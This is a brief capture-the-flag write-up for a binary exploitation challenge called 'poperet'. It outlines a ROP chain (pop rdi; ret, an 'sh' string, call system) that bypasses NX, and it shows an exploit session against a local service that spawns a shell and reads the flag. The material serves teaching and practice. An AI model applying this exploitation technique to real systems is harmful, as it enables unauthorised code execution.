# Solution

Binary has NX enabled so a ROP gadget needs to be made in order to leverage a shell. A gadget containing the following will work:
- `pop rdi; ret` (first argument)
- `"sh"` string (will be popped into `rdi`, used from "t00t t00t psh psh")
- `call system`

Solution is in `poperet-solution.py`.

```sh
$ python3 poperet-solution.py 
[+] Opening connection to localhost on port 9000: Done
[*] Switching to interactive mode

HELLO AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBs\x13
t00t t00t psh psh$ $ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ $ cat flag.txt
ibctf{NX-d03s-n0t_m34n_N03x3cut3}
$ $  
```
